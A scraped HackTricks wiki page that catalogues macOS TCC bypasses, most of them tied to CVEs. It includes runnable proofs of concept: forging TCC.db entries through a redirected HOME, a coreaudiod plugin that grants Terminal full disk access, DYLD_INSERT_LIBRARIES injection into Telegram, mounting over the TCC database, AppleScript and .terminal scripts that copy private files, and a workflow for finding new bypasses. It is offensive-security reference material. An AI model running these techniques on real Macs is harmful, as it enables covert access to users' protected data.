---
title: "macOS TCC Bypasses"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/index.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: misc
---

## By functionality

### Write Bypass

This is not a bypass, it’s just how TCC works: **It doesn’t protect from writing**. If Terminal **doesn’t have access to read the Desktop of a user it can still write into it**:

```
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** access to read it.[\[2\]](#references)

### TCC ClickJacking

It’s possible to **put a window over the TCC prompt** to make the user **accept** it without noticing. You can find a PoC in **TCC-ClickJacking****.**[\[18\]](#references)

### TCC Request by arbitrary name

Attacker can **create apps with any name** (e.g. Finder, Google Chrome…) in the **`Info.plist`** and make it request access to some TCC protected location. The user will think that the legit application is the one requesting this access.

Moreover, it’s possible to **remove the legit app from the Dock and put the fake one on it**, so when the user clicks on the fake one (which can use the same icon) it could call the legit one, ask for TCC permissions and execute a malware, making the user believe the legit app requested the access.[\[2\]](#references)

More info and PoC in:

### SSH Bypass

By default an access via **SSH used to have “Full Disk Access”**. In order to disable this you need to have it listed but disabled (removing it from the list won’t remove those privileges):[\[2\]](#references)

Here you can find examples of how some **malwares have been able to bypass this protection**:

Caution

Note that now, in order to be able to enable SSH you need **Full Disk Access**

### Handle extensions - CVE-2022-26767

The attribute **`com.apple.macl`** is given to files to give a **certain application permissions to read it.** This attribute is set when **drag&drop** a file over an app, or when a user **double-clicks** a file to open it with the **default application**.

Therefore, a user could **register a malicious app** to handle all the extensions and call Launch Services to **open** any file (so the malicious file will be granted access to read it).[\[23\]](#references)

### iCloud

The entitlement **`com.apple.private.icloud-account-access`** it’s possible to communicate with **`com.apple.iCloudHelper`** XPC service which will **provide iCloud tokens**.

**iMovie** and **Garageband** had this entitlement and others that allowed.

For more **information** about the exploit to **get icloud tokens** from that entitlement check the talk: **#OBTS v5.0: “What Happens on your Mac, Stays on Apple’s iCloud?!” - Wojciech Regula**[\[10\]](#references)

### kTCCServiceAppleEvents / Automation

An app with the **`kTCCServiceAppleEvents`** permission will be able to **control other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.[\[2\]](#references)

For more info about Apple Scripts check:

For example, if an App has **Automation permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:

#### Over iTerm

Terminal, who doesn’t have FDA, can call iTerm, which has it, and use it to perform actions:

```
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```
```
osascript iterm.script
```
#### Over Finder

Or if an App has access over Finder, it could a script such as this one:

```
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## By App behaviour

### CVE-2020–9934 - TCC

The userland **tccd daemon** what using the `HOME`**env** variable to access the TCC users database from: `$HOME/Library/Application Support/com.apple.TCC/TCC.db`

According to [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) and because the TCC daemon is running via `launchd` within the current user’s domain, it’s possible to **control all environment variables** passed to it.[\[19\]](#references)

Thus, an **attacker could set `$HOME` environment** variable in **`launchctl`** to point to a **controlled** **directory**, **restart** the **TCC** daemon, and then **directly modify the TCC database** to give itself **every TCC entitlement available** without ever prompting the end user.[\[1\]](#references)

PoC:

```
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes had access to TCC-protected locations, but a newly created note was **stored in a non-protected location**. Therefore, an attacker could ask Notes to copy a protected file into a note and then access the resulting data from the non-protected location:

### CVE-2021-30782 - Translocation

The binary `/usr/libexec/lsd` with the library `libsecurity_translocate` had the entitlement `com.apple.private.nullfs_allow` which allowed it to crate **nullfs** mount and had the entitlement `com.apple.private.tcc.allow` with **`kTCCServiceSystemPolicyAllFiles`** to access every file.

It was possible to add the quarantine attribute to “Library”, call the **`com.apple.security.translocation`** XPC service and then it would map Library to **`$TMPDIR/AppTranslocation/d/d/Library`** where all the documents inside Library could be **accessed**.

### CVE-2024-44131 - FileProvider symlink race

Apps that hand file operations over to a **privileged helper** (here **`fileproviderd`** / `Files.app`) copy or move items **on behalf of the user**, so the copy runs with the helper’s privileges instead of the caller’s.

Jamf Threat Labs showed that the symlink validation performed before the operation can be **raced**: instead of planting the symlink on the **last** path component (which is checked), the attacker swaps an **intermediate** directory of the path **after the copy has already started**. The privileged helper then follows the attacker-controlled link and reads/writes TCC-protected locations **without ever showing a prompt**.[\[5\]](#references)

Directories that are **not** protected by a random UUID in their path (for example `~/Library/Mobile Documents/com~apple~CloudDocs`) are the easiest targets, because the attacker can predict the full path to race.

This is the generic pattern to look for: **any privileged process that resolves a path more than once** (check-then-use, or `rename()`/`copyfile()` resolving source and destination separately) can be raced by swapping a directory in the middle of the path. Only `O_NOFOLLOW_ANY`, `openat()` on an already-opened directory FD, or `realpath()` + re-validation actually close the window.

More info in [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).[\[5\]](#references)

### SQLITE_SQLLOG_DIR

`libsqlite3` can be built with `SQLITE_ENABLE_SQLLOG`, which adds a logging hook driven by environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):[\[6\]](#references)

- **`SQLITE_SQLLOG_DIR=path`** – for**every database that is opened** , a**copy of the database file** and a log of the SQL statements are written into`path` (the directory must already exist).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – take a**fresh copy every time** a DB is opened/attached instead of reusing one.
- **`SQLITE_SQLLOG_CONDITIONAL`** – only log a connection if a`<database>-sqllog` file exists next to the main DB.

If you can inject this variable into a process that has **FDA** and opens SQLite databases, it will happily **copy those protected databases** into a directory you control. Because the destination filename is derived from attacker-controlled data, a **symlink planted at the destination** turns the same primitive into an **arbitrary file write** with the target process’ privileges.

### **SQLITE_AUTO_TRACE**

**SQLITE_AUTO_TRACE**

If the environment variable **`SQLITE_AUTO_TRACE`** is set, the library **`libsqlite3.dylib`** will start **logging** all the SQL queries. Many applications used this library, so it was possible to log all their SQLite queries.[\[22\]](#references)

Several Apple applications used this library to access TCC protected information.

```
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Hunting for env-var driven file writes

The two previous entries are instances of the same generic technique, and it is worth hunting for more: **frameworks loaded into TCC-privileged apps often expose debug/logging environment variables that make the process create a file at a caller-controlled path**.

Workflow to find them:

1. Pick a target with FDA or another juicy TCC permission (`Music` ,`TV` ,`Terminal` , MDM agents…) and list the frameworks it links (`otool -L` ,`vmmap` ).
2. Grep those frameworks for `getenv` strings:`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'` .
3. Set candidate variables via `launchctl setenv NAME /path/you/control` , launch the app and watch what it does on the filesystem with`fs_usage -w -f filesys <pid>` or`sudo fs_usage | grep <path>` .
4. If the process **creates or renames** a file in your directory, you have a write primitive: point the destination at a symlink (or race an intermediate directory, as in CVE-2024-44131 above) to redirect it onto`~/Library/Application Support/com.apple.TCC/TCC.db` .

Two things limit this. First, **`DYLD_*` variables are ignored for hardened-runtime binaries** unless the app ships the [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement (“a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app’s process”) — see also [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Second, Apple removes individual framework debug variables as they get reported, so a variable that worked on one macOS release is often gone on the next. If an app silently refuses to launch after you set one, treat that variable as already filtered.[\[7\]](#references)[\[8\]](#references)

Look at [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.html) for the equivalent trick with linker variables.

### Apple Remote Desktop

As root you could enable this service and the **ARD agent will have full disk access** which could then be abused by a user to make it copy a new **TCC user database**.

## By **NFSHomeDirectory**

**NFSHomeDirectory**

TCC uses a database in the user’s HOME folder to control access to resources specific to the user at **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.

Therefore, if the user manages to restart TCC with a $HOME env variable pointing to a **different folder**, the user could create a new TCC database in **/Library/Application Support/com.apple.TCC/TCC.db** and trick TCC to grant any TCC permission to any app.

Note that Apple uses the setting stored within the user’s profile in the **`NFSHomeDirectory`** attribute for the **value of `$HOME`**, so if you compromise an application with permissions to modify this value (**`kTCCServiceSystemPolicySysAdminFiles`**), you can **weaponize** this option with a TCC bypass.

### CVE-2020–9934 - TCC

### CVE-2020-27937 - Directory Utility

### CVE-2021-30970 - Powerdir

The **first POC** uses [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) and [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) to modify the **HOME** folder of the user.

1. Get a *csreq* blob for the target app.
2. Plant a fake *TCC.db* file with required access and the*csreq* blob.
3. Export the user’s Directory Services entry with [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) .
4. Modify the Directory Services entry to change the user’s home directory.
5. Import the modified Directory Services entry with [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) .
6. Stop the user’s *tccd* and reboot the process.

The second POC used **`/usr/libexec/configd`** which had `com.apple.private.tcc.allow` with the value `kTCCServiceSystemPolicySysAdminFiles`.

It was possible to run **`configd`** with the **`-t`** option, an attacker could specify a **custom Bundle to load**. Therefore, the exploit **replaces** the **`dsexport`** and **`dsimport`** method of changing the user’s home directory with a **`configd` code injection**.

For more info check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).[\[11\]](#references)

## By process injection

There are different techniques to inject code inside a process and abuse its TCC privileges:

Moreover, the most common process injection to bypass TCC found is via **plugins (load library)**.

Plugins are extra code usually in the form of libraries or plist, that will be **loaded by the main application** and will execute under its context. Therefore, if the main application had access to TCC restricted files (via granted permissions or entitlements), the **custom code will also have it**.

### CVE-2020-27937 - Directory Utility

The application `/System/Library/CoreServices/Applications/Directory Utility.app` had the entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, loaded plugins with **`.daplug`** extension and **didn’t have the hardened** runtime.

To weaponize this CVE, the **`NFSHomeDirectory`** is **changed** (abusing the previous entitlement) to **take over the user’s TCC database** and bypass TCC.

For more info check the [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).[\[12\]](#references)

### CVE-2020-29621 - Coreaudiod

The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.

This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:[\[13\]](#references)

```
#import <Foundation/Foundation.h>
#import <Security/Security.h>
extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);
void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}
__attribute__((constructor)) static void constructor(int argc, const char **argv) {
    add_tcc_entry();
    NSLog(@"[+] Exploitation finished...");
    exit(0);
```
For more info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).[\[13\]](#references)

### Device Abstraction Layer (DAL) Plug-Ins

System applications that open camera stream via Core Media I/O (apps with **`kTCCServiceCamera`**) load **in the process these plugins** located in `/Library/CoreMediaIO/Plug-Ins/DAL` (not SIP restricted).

Just storing in there a library with the common **constructor** will work to **inject code**.

Several Apple applications were vulnerable to this.

### Firefox

The Firefox application had the `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables` entitlements:[\[14\]](#references)

```
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```
Fore more info about how to easily exploit this [**check the original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).[\[14\]](#references)

### CVE-2020-10006

The binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` had the entitlements **`com.apple.private.tcc.allow`** and **`com.apple.security.get-task-allow`**, which allowed to inject code inside the process and use the TCC privileges.

### CVE-2023-26818 - Telegram

Telegram had the entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** and **`com.apple.security.cs.disable-library-validation`**, so it was possible to abuse it to **get access to its permissions** such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).[\[15\]](#references)

Note how to use the env variable to load a library a **custom plist** was created to inject this library and **`launchctl`** was used to launch it:[\[15\]](#references)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```
```
launchctl load com.telegram.launcher.plist
```
## By open invocations

It’s possible to invoke **`open`** even while sandboxed

### Terminal Scripts

It’s quiet common to give terminal **Full Disk Access (FDA)**, at least in computers used by tech people. And it’s possible to invoke **`.terminal`** scripts using with it.

**`.terminal`** scripts are plist files such as this one with the command to execute in the **`CommandString`** key:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```
An application could write a terminal script in a location such as /tmp and launch it with a come such as:

```
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.

The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.[\[2\]](#references)

```
# Create snapshot
tmutil localsnapshot
# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local
# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap
# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
# Access it
ls /tmp/snap/Users/admin_user # This will work
```
A more detailed explanation can be **found in the original report****.**[\[20\]](#references)

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Even if TCC DB file is protected, It was possible to **mount over the directory** a new TCC.db file:

```
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg
# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
```
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).[\[21\]](#references)

### CVE-2024-40855

As explained in the [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), this CVE abused `diskarbitrationd`.[\[16\]](#references)

The function `DADiskMountWithArgumentsCommon` from the public `DiskArbitration` framework performed the security checks. However, it’s possible to bypass it by directly calling `diskarbitrationd` and therefore use `../` elements in the path and symlinks.

This allowed an attacker to do arbitrary mounts in any location, including over the TCC database due to the entitlement `com.apple.private.security.storage-exempt.heritable` of `diskarbitrationd`.

### asr

The tool **`/usr/sbin/asr`** allowed to copy the whole disk and mount it in another place bypassing TCC protections.

### CVE-2022-22655 - Location Services

Location Services are **not** stored in a TCC database like the other services. They are managed by `locationd`, which keeps its own allow-list in **`/var/db/locationd/clients.plist`**:[\[4\]](#references)

```
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Each entry is keyed by the client (bundle ID or executable path) and carries fields such as `Authorized`, `BundleId`, `Executable` and `Registered`.[\[4\]](#references)

The `clients.plist` file itself is protected by Sandbox/TCC and cannot be edited even as root — but the **`/var/db/locationd/` directory was not protected from mounting**. So an attacker running as root could build a disk image containing their own `clients.plist` (with their binary marked `Authorized`), mount it over the directory, and restart `locationd` to have the forged allow-list take effect.[\[3\]](#references)

This is the same pattern as the `hdiutil`/`mount` TCC bypasses above: the *file* is protected, the *directory it lives in* is not, so you replace the whole directory instead of the file.

## By startup apps

## By grep

In several occasions files will store sensitive information like emails, phone numbers, messages… in non protected locations (which count as a vulnerability in Apple).

## Synthetic Clicks

This doesn’t work anymore, but it **did in the past****:**

Another way using [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):[\[17\]](#references)

## References
